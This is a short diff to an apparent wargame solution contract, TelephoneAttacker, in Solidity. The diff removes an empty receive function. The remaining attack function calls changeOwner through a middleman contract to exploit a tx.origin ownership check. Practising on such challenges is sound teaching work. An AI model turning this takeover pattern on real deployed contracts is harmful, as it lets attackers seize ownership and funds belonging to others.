@@ -14,6 +14,4 @@ contract TelephoneAttacker {
     function attack() external payable {
         challenge.changeOwner(tx.origin);
     }
-
-    receive() external payable {}
 }
